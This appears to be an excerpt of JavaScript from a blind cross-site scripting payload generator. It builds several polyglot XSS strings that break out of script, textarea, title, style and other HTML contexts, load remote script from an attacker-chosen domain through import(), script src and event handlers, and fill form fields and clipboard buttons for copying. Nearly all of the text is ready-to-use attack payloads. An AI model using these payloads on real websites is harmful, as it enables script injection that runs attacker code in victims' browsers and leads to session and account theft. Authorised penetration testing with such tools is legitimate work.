...
function payloadBuilder(){
    ...
    let polyUrl = `https://${xdomain}?n=${xnonce}`;
    // Escape / to \/ for regex source usage
    let polyUrlEscaped = polyUrl.replace(/\//g, '\\/'); 
    // Note: escape backtick ` inside template literal with \`
	p9 = `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/${polyUrlEscaped}/.source))//>`;
    
    // New Payloads
    p10 = `--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://${xdomain}?n=${xnonce}"></scrIpt>`;
    p11 = `'/*\\'/*"/*\\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\\\${xdomain}?n=${xnonce}/.source))//>`;
    p12 = `';"/></textarea></script><script/src=//${xdomain}?n=${xnonce}></script><Img Src=//${xdomain}?n=${xnonce} OnLoad%0C=import(src)>--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=https://${xdomain}?n=${xnonce}></script>`;
    p13 = `JavaScript://%250A/*?'/*\\'/*"/*\\"/*\`/*\\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*\${/*/;{/**/(import(/https:\\\\${xdomain}?n=${xnonce}/.source))}//\\76-->`;
    ...
    document.getElementById("payload9").value = p9;
    document.getElementById("payload10").value = p10;
    document.getElementById("payload11").value = p11;
    document.getElementById("payload12").value = p12;
    document.getElementById("payload13").value = p13;
...
function copyBuild(){
    ...
    copyInputValue("payload9","copy9");
    copyInputValue("payload10","copy10");
    copyInputValue("payload11","copy11");
    copyInputValue("payload12","copy12");
    copyInputValue("payload13","copy13");
...
function toggleEncoding() {
    const ids = ["payload0", "payload1", "payload2", "payload3", "payload4", "payload5", "payload6", "payload7", "payload8", "payload9", "payload10", "payload11", "payload12", "payload13"];
    isEncoded = !isEncoded;
    ...
    btn.textContent = isEncoded ? "Decode" : "Encode";
}
